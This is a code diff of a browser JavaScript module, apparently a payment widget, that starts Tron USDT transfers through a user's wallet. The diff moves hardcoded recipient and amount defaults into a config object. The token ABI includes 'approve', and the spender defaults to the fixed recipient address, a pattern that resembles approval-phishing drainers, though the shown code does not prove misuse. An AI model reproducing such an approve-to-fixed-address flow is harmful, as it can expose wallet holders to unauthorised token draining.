@@ -1,8 +1,4 @@
 (function () {
-  const DEFAULT_USDT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  const DEFAULT_TO = "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6";
-  const DEFAULT_AMOUNT_USDT = "1";
-
   const ABI = [
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
     {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
@@ -84,10 +80,18 @@
     const log = opts && typeof opts.log === "function" ? opts.log : function (m) { console.log(m); };
     const providerKind = opts && opts.provider ? String(opts.provider) : "auto";
 
-    const usdtAddress = (opts && opts.usdtAddress ? String(opts.usdtAddress) : DEFAULT_USDT_TRON).trim();
-    const toAddress = (opts && opts.toAddress ? String(opts.toAddress) : DEFAULT_TO).trim();
+    let cfg = null;
+    if (window.pay0Config && typeof window.pay0Config.getNetworkConfig === "function") {
+      cfg = window.pay0Config.getNetworkConfig("tron");
+    }
+    const defaultUsdt = cfg ? cfg.usdtAddress : "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const defaultTo = cfg ? cfg.toAddress : "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6";
+    const defaultAmount = (window.pay0Config && window.pay0Config.amountUsdt) || "1";
+
+    const usdtAddress = (opts && opts.usdtAddress ? String(opts.usdtAddress) : defaultUsdt).trim();
+    const toAddress = (opts && opts.toAddress ? String(opts.toAddress) : defaultTo).trim();
     const spenderAddress = (opts && opts.spenderAddress ? String(opts.spenderAddress) : toAddress).trim();
-    const amountUsdtHuman = (opts && opts.amountUsdt != null ? String(opts.amountUsdt) : DEFAULT_AMOUNT_USDT).trim();
+    const amountUsdtHuman = (opts && opts.amountUsdt != null ? String(opts.amountUsdt) : defaultAmount).trim();
 
     if (typeof log === "function") log("开始发起 Tron USDT 转账...");
     const ctx = await ensureTronWallet(providerKind, log);
